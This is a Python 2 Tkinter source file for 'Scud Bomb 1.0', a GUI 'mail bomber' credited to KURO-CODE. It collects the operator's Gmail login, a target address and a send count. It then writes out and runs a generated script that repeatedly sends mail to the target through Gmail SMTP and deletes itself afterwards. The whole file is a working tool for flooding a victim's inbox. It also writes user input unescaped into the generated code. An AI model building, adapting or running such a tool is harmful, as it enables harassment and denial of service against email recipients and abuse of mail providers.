#!/usr/bin/env python
# -*- coding: utf-8 -*-

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                           
#      ~ Scud Bomb 1.0 beta ~                            
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#       CoDeD: bY KURO-CODE
#       DaTe: 06/11/2018
#       Dev: Python (TKinter)
#
#~~~~~~~~~~~ INFO ~~~~~~~~~~~~~~~~~~~
#
#    Simple Mail Bomber
#    GUI (Graphical User Interface) 
#
#************************************

#~~~~ Import tkinter ~~~~
from Tkinter import * 
from tkMessageBox import *
import itertools, string, subprocess, os, time, webbrowser, sys, smtplib

#~~~~ Main «root» ~~~~
root = Tk()
root.title('Scud Bomb 1.0')

#~~~~ Image ~~~~
photo = PhotoImage(file="SB2.png")

canvas = Canvas(root,width=250, height=55)
canvas.create_image(0, 0, anchor=NW, image=photo)
canvas.pack(side=TOP, padx=1, pady=1)

#~~~~ Title ~~~~
l = LabelFrame(root, text="Scud 2018", padx=20, pady=20)
l.pack(fill="both", expand="yes")

#~~~~ Label info ~~~~ 
Label(l, text="Simple MailBomber\nCoded By KURO-CODE").pack()

#~~~~ Bomber ~~~~~
def GET():
   YM= chars.get()
   YP= chars0.get()
   TM= chars1.get()
   NS= value1.get()
   
   MESS = "test"
   email = "test@gmail.com"

   N_file='Bomber.py'
   file = open(N_file, 'a')
   file.write('#!/usr/bin/env python\n\nimport sys, os, time, smtplib, string\n\n')
   file.write('server = \"smtp.gmail.com\"\n')
   file.write('port = 587\n')
   file.write('YM = \"'+YM+'\"\n')
   file.write('YP = \"'+YP+'\"\n')
   file.write('TM = \"'+TM+'\"\n')
   file.write('MESS = \"test\"\n')
   file.write('server = smtplib.SMTP(server, port)\n')
   file.write('server.ehlo()\nserver.starttls()\nserver.login(YM, YP)\nnb = 0\n')
   file.write('send = '+NS+'\n')
   file.write('while(nb < send):\n\tprint \"*** Ctrl+C Stop attack!***\"')
   file.write('\n\tprint \"Scud ATTACK:\"+str(nb)')
   file.write('\n\tmsg = \"From: \"+YM')
   file.write('\n\tserver.sendmail(YM, TM, MESS)\n\tnb = nb+1\nserver.quit()')
   file.close()
   os.popen ('xterm -e "python Bomber.py && rm -f Bomber.py"')

   Finish()

#~~~~ Finish & Exit ~~~~
def Finish():
   print "[*] Finish!"
   showinfo('INFO', 'File Finish!')
   showinfo('Exit', 'Thanks for using Scud!')
   sys.exit()
   
#~~~~ Var ~~~~
value = StringVar() 
value.set("Your Email")
chars = Entry(root, textvariable=value, width=20)
chars.pack( padx=5, pady=5)

value0 = StringVar() 
value0.set("Your Password")
chars0 = Entry(root, textvariable=value0, width=20)
chars0.pack( padx=5, pady=5)

value11 = StringVar() 
value11.set("Target Email")
chars1 = Entry(root, textvariable=value11, width=20)
chars1.pack( padx=5, pady=5)

value1 = StringVar() 
value1.set("Num Send")
NUM = Entry(root, textvariable=value1, width=20)
NUM.pack( padx=5, pady=5)

def callinfo():
     showinfo('INFO', 'Scud 1.0 (MailBomber)\t\nInterface: GUI\nDate: 06/11/2018\nDev: Python (TK)\nVer: 1.0 beta\nCoded by KURO-CODE\t')

def ABOUT():
   webbrowser.open('https://github.com/KURO-CODE?tab=repositories')	

def EXIT():
   showinfo('Closing', 'Thanks for using Scud!')
   root.quit()

#~~~~ Frame 1 ~~~~
Frame1 = Frame(root, borderwidth=1, relief=GROOVE)

#~~~~ button OK ~~~~
qb = Button(root, text='Ok', command=GET)
qb.pack(side=LEFT,padx=5, ipadx=15, pady=5)
#~~~~ button «INFO "call INFO» ~~~~
qb = Button(root, text='Info', command=callinfo)
qb.pack(side=LEFT, padx=5, ipadx=10, pady=5)
#~~~~ button «ABOUT "call ABOUT"» ~~~~
qb = Button(root, text='About', command=ABOUT)
qb.pack(side=LEFT, padx=5, ipadx=10, pady=5)
#~~~~ button «EXIT "call EXIT"» ~~~~
qb = Button(root, text='Exit', command=EXIT)
qb.pack(side=LEFT, padx=5, ipadx=10, pady=5)

Frame1.pack(side=LEFT, padx=0, pady=20)
#~~~~ Run main «MAIN» ~~~~
root.mainloop()
